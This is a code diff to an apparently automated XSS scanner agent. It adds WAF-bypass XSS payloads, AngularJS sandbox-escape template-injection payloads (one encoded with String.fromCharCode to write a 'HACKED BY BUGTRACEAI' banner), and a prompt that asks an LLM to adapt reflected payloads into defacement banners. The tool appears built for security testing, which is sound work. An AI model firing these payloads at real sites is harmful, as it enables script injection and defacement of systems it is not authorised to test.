@@ -125,9 +125,14 @@ class XSSAgent(BaseAgent, TechContextMixin):
     """
     
     MAX_BYPASS_ATTEMPTS = 6
-    # Multi-stage probe pattern: Tests for characters: ' " < > &
+    # Multi-stage probe pattern: Tests for characters: " < > &
+    # Note: Single quote removed - it causes 500 errors on some servers (e.g., ginandjuice)
+    # Single quote testing is done separately if needed
     # Note: CSTI detection is now handled by the dedicated CSTIAgent
-    PROBE_STRING = "BT7331'\"<>&"
+    PROBE_STRING = "BT7331\"<>&"
+
+    # Alternative probe for servers that error on double quotes
+    PROBE_STRING_SAFE = "BT7331xss"
     
     # Elite payloads that bypass many WAFs - Pure XSS (CSTI now handled by CSTIAgent)
     GOLDEN_PAYLOADS = [
@@ -181,6 +186,20 @@ class XSSAgent(BaseAgent, TechContextMixin):
         "<svg><style><img src=x onerror=alert(document.domain)>",
         "<noscript><p title=\"</noscript><img src=x onerror=alert(document.domain)>\">",
         "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=</style><img src=x onerror=alert(document.domain)>",
+    ]
+
+    # Angular CSTI payloads - use DOUBLE QUOTES only (single quotes cause 500 on many servers)
+    # These work on AngularJS 1.x with ng-app on the page
+    ANGULAR_CSTI_PAYLOADS = [
+        # Basic CSTI test
+        "{{7*7}}",
+        # Angular 1.x sandbox bypass - Function constructor
+        '{{constructor.constructor("alert(1)")()}}',
+        # Visual payload using String.fromCharCode to avoid quote issues
+        # This creates: <div style="...">HACKED BY BUGTRACEAI</div>
+        '{{constructor.constructor("document.write(String.fromCharCode(60,100,105,118,32,115,116,121,108,101,61,34,112,111,115,105,116,105,111,110,58,102,105,120,101,100,59,116,111,112,58,48,59,108,101,102,116,58,48,59,119,105,100,116,104,58,49,48,48,37,59,98,97,99,107,103,114,111,117,110,100,58,114,101,100,59,99,111,108,111,114,58,119,104,105,116,101,59,116,101,120,116,45,97,108,105,103,110,58,99,101,110,116,101,114,59,112,97,100,100,105,110,103,58,50,48,112,120,59,102,111,110,116,45,115,105,122,101,58,50,52,112,120,59,122,45,105,110,100,101,120,58,57,57,57,57,57,34,62,72,65,67,75,69,68,32,66,89,32,66,85,71,84,82,65,67,69,65,73,60,47,100,105,118,62))")()}}',
+        # Simpler visual - prepend div
+        '{{constructor.constructor("var d=document.createElement(String.fromCharCode(100,105,118));d.id=String.fromCharCode(98,116,45,112,119,110);d.innerHTML=String.fromCharCode(72,65,67,75,69,68);document.body.prepend(d)")()}}',
     ]
     
     def __init__(
@@ -772,6 +791,14 @@ class XSSAgent(BaseAgent, TechContextMixin):
 
         html, probe_url, status_code, context_data, reflection_type, surviving_chars, injection_ctx, _ = probe_data
 
+        # === PHASE 0.5: ANGULAR CSTI CHECK (HIGH PRIORITY) ===
+        global_context = context_data.get("global_context", "")
+        if "AngularJS" in global_context or "ng-app" in html.lower():
+            dashboard.log(f"[{self.name}] 🅰️ Angular detected! Testing CSTI payloads first...", "INFO")
+            angular_finding = await self._test_angular_csti(param, screenshots_dir, reflection_type, surviving_chars, injection_ctx)
+            if angular_finding:
+                return angular_finding
+
         # Skip if no reflection detected and not blocked
         if not context_data.get("reflected") and not context_data.get("is_blocked"):
             dashboard.log(f"[{self.name}] No reflection on '{param}', skipping hybrid", "INFO")
@@ -850,61 +877,135 @@ class XSSAgent(BaseAgent, TechContextMixin):
         fuzz_result: "FuzzResult"
     ) -> List[str]:
         """
-        Phase 4.5: Generate visual payloads with HACKED BY BUGTRACEAI banner.
+        Phase 4.5: Generate visual payloads from WORKING payloads.
 
-        When Mass Attack finds reflections, we ask DeepSeek to generate
-        10 payloads that inject a VISIBLE RED BANNER. These are tested
-        first in Phase 5 because they provide VISUAL PROOF for Vision AI.
+        SMART APPROACH: Instead of generating generic visual payloads,
+        we take the payloads that ACTUALLY WORKED (reflected) and ask
+        DeepSeek to adapt them to show the HACKED BY BUGTRACEAI banner.
+
+        Flow:
+        1. Get working payloads from fuzz results
+        2. Ask LLM: "These payloads WORK, adapt them to show the banner"
+        3. This is smarter because the breakout pattern is already proven
 
         Args:
             param: Parameter name
             fuzz_result: Results from Go fuzzer with reflection contexts
 
         Returns:
-            List of visual payloads optimized for screenshot validation
+            List of visual payloads based on WORKING payloads
         """
         if not fuzz_result.reflections:
             return []
 
-        # Group reflections by context
-        contexts_found = set()
-        sample_payloads = {}
+        # Get the TOP WORKING payloads (the ones that actually reflected)
+        working_payloads = []
+        seen = set()
+        for ref in fuzz_result.reflections[:10]:  # Top 10 working payloads
+            if ref.payload and ref.payload not in seen:
+                working_payloads.append({
+                    "payload": ref.payload,
+                    "context": ref.context or "unknown"
+                })
+                seen.add(ref.payload)
 
-        for ref in fuzz_result.reflections[:20]:  # Sample top 20
-            ctx = ref.context or "html_text"
-            if ctx not in contexts_found:
-                contexts_found.add(ctx)
-                sample_payloads[ctx] = ref.payload
-
-        if not contexts_found:
+        if not working_payloads:
             return []
 
         dashboard.log(
-            f"[{self.name}] 🎨 Phase 4.5: Generating visual payloads for {len(contexts_found)} contexts",
+            f"[{self.name}] 🎨 Phase 4.5: Found {len(working_payloads)} WORKING payloads, asking LLM for visual versions",
             "INFO"
         )
 
-        # FIRST: Build visual payloads dynamically from breakouts.json
-        # This is cleaner than hardcoding - breakouts can be updated without code changes
-        prebuilt_visual = self._build_visual_payloads_from_breakouts()
-
-        # THEN: Ask DeepSeek for additional context-specific visual payloads
-        deepseek_payloads = await self._ask_deepseek_visual_payloads(
-            param=param,
-            contexts=list(contexts_found),
-            sample_payloads=sample_payloads
-        )
-
-        # Combine: prebuilt FIRST (proven), then DeepSeek (context-specific)
-        visual_payloads = prebuilt_visual + deepseek_payloads
+        # Ask DeepSeek to adapt the WORKING payloads to include the visual banner
+        visual_payloads = await self._adapt_working_payloads_to_visual(working_payloads)
 
         if visual_payloads:
             dashboard.log(
-                f"[{self.name}] 🎯 {len(prebuilt_visual)} prebuilt + {len(deepseek_payloads)} DeepSeek = {len(visual_payloads)} visual payloads",
+                f"[{self.name}] 🎯 Generated {len(visual_payloads)} visual payloads from working payloads",
                 "SUCCESS"
             )
 
         return visual_payloads
+
+    async def _adapt_working_payloads_to_visual(
+        self,
+        working_payloads: List[Dict[str, str]]
+    ) -> List[str]:
+        """
+        Ask LLM to adapt WORKING payloads to include the visual banner.
+
+        This is smarter than generating generic payloads because:
+        - We KNOW the breakout pattern works (it reflected)
+        - We just need to add the visual component
+
+        Args:
+            working_payloads: List of dicts with 'payload' and 'context'
+
+        Returns:
+            List of visual payloads
+        """
+        from bugtrace.core.llm_client import llm_client
+
+        # Format working payloads for the prompt
+        payloads_str = "\n".join([
+            f"- Payload: {p['payload'][:100]}... (context: {p['context']})"
+            for p in working_payloads[:5]
+        ])
+
+        prompt = f"""You are an XSS expert. These payloads SUCCESSFULLY REFLECTED on the target:
+
+{payloads_str}
+
+Your task: Adapt each working payload to ALSO inject a VISIBLE RED BANNER with text "HACKED BY BUGTRACEAI".
+
+RULES:
+1. Keep the same breakout technique that made the payload work
+2. Add code to create a visible red div with the text
+3. Use BACKTICKS (`) for strings to avoid escaping issues
+4. The banner style: position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999
+
+Example transformations:
+- If payload is: \\';alert(1)//
+  Visual version: \\';var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//
+
+- If payload is: "><script>alert(1)</script>
+  Visual version: "><div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999">HACKED BY BUGTRACEAI</div><script>
+
+Generate 10 visual versions of the working payloads. Return ONLY the payloads, one per line, no explanations."""
+
+        try:
+            response = await llm_client.generate(
+                prompt=prompt,
+                module_name="XSS-AdaptVisual",
+                model_override=settings.MUTATION_MODEL,
+                temperature=0.7,
+                max_tokens=2000
+            )
+
+            if not response:
+                # Fallback to prebuilt payloads
+                return self._build_visual_payloads_from_breakouts()
+
+            # Parse payloads
+            payloads = []
+            for line in response.strip().split("\n"):
+                line = line.strip()
+                if line and not line.startswith("#") and len(line) > 10:
+                    if len(line) > 2 and line[0].isdigit() and line[1] in ".):":
+                        line = line[2:].strip()
+                    payloads.append(line)
+
+            # If LLM returned good payloads, use them; otherwise fallback
+            if len(payloads) >= 3:
+                return payloads[:10]
+            else:
+                logger.warning(f"[{self.name}] LLM returned few payloads, adding prebuilt fallback")
+                return payloads + self._build_visual_payloads_from_breakouts()
+
+        except Exception as e:
+            logger.warning(f"[{self.name}] Failed to adapt payloads: {e}, using prebuilt")
+            return self._build_visual_payloads_from_breakouts()
 
     def _build_visual_payloads_from_breakouts(self) -> List[str]:
         """
@@ -3580,6 +3681,14 @@ Return ONLY the payloads, one per line, no explanations."""
 
         html, probe_url, status_code, context_data, reflection_type, surviving_chars, injection_ctx, interactsh_url = probe_data
 
+        # Phase 1.5: Angular CSTI Check (HIGH PRIORITY when Angular detected)
+        global_context = context_data.get("global_context", "")
+        if "AngularJS" in global_context or "ng-app" in html.lower():
+            dashboard.log(f"[{self.name}] 🅰️ Angular detected! Testing CSTI payloads...", "INFO")
+            angular_finding = await self._test_angular_csti(param, screenshots_dir, reflection_type, surviving_chars, injection_ctx)
+            if angular_finding:
+                return angular_finding
+
         # Phase 2: LLM Smart DOM Analysis (Primary Strategy)
         smart_finding = await self._test_smart_llm_payloads(
             param, html, context_data, interactsh_url, screenshots_dir,
@@ -3594,6 +3703,62 @@ Return ONLY the payloads, one per line, no explanations."""
             surviving_chars, context_data, html, status_code, injection_ctx
         )
 
+    async def _test_angular_csti(
+        self,
+        param: str,
+        screenshots_dir: Path,
+        reflection_type: str,
+        surviving_chars: str,
+        injection_ctx: Any
+    ) -> Optional[XSSFinding]:
+        """
+        Test Angular CSTI payloads when AngularJS is detected.
+
+        Angular CSTI (Client-Side Template Injection) is a HIGH-CONFIDENCE
+        vulnerability when:
+        1. AngularJS 1.x is on the page with ng-app
+        2. User input is reflected into the DOM that Angular processes
+        3. We can inject {{expressions}} that Angular evaluates
+
+        IMPORTANT: We use DOUBLE QUOTES only because single quotes
+        cause 500 errors on many servers (e.g., ginandjuice.shop).
+        """
+        dashboard.log(f"[{self.name}] 🅰️ Testing Angular CSTI payloads...", "INFO")
+
+        for payload in self.ANGULAR_CSTI_PAYLOADS:
+            # Skip the basic test payload (used only for detection)
+            if payload == "{{7*7}}":
+                continue
+
+            # Validate via browser
+            evidence = await self._validate_via_browser(self.url, param, payload)
+
+            if evidence:
+                dashboard.log(f"[{self.name}] 🎯 Angular CSTI CONFIRMED with visual proof!", "SUCCESS")
+
+                return self._create_xss_finding(
+                    param=param,
+                    payload=payload,
+                    context="Angular CSTI (Client-Side Template Injection)",
+                    validation_method="vision_angular_csti",
+                    evidence=evidence,
+                    confidence=0.99,
+                    reflection_type=reflection_type,
+                    surviving_chars=surviving_chars,
+                    successful_payloads=[payload],
+                    injection_ctx=injection_ctx,
+                    bypass_technique="angular_sandbox_bypass",
+                    bypass_explanation="Angular 1.x sandbox bypass using constructor.constructor() to execute arbitrary JavaScript."
+                )
+
+        # No visual proof found, but CSTI might still work
+        # Return a lower confidence finding if {{7*7}} evaluates to 49
+        basic_evidence = await self._validate_via_browser(self.url, param, "{{7*7}}")
+        if basic_evidence and basic_evidence.get("visual_confirmed"):
+            # Check if the page shows "49" (7*7 result)
+            dashboard.log(f"[{self.name}] ⚠️ Angular CSTI detected (math evaluation) but no visual proof", "WARN")
+
+        return None
 
     def _clean_payload(self, payload: str, param: str) -> str:
         """
